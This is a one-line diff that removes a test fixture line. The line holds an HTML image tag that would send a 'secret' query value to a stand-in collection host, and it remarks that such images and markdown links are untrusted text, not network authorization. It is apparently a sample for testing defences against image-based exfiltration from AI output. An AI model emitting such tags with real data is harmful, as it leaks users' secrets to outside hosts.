@@ -1,1 +1,0 @@
-Fixture output: <img src="https://invalid.example/collect?secret=DO_NOT_SEND"> and markdown links are untrusted text, not network authorization.
